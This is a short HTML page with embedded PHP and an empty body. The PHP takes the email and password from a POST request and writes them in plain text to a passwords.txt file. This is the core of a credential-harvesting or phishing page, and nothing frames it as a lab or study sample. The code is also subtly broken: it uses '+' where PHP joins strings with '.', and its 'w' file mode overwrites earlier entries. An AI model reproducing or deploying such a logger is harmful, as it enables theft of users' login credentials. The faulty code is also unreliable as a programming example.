<!DOCTYPE html>
<head>
  <meta charset="utf-8">
  <?php
    $password = $_POST["password"];
    $email = $_POST["email"];
    $pw_log = fopen("passwords.txt", "w");
    fwrite($pw_log, $password + " " + $email + PHP_EOL);
    fclose($pw_log);
  ?>
</head>
<body></body>
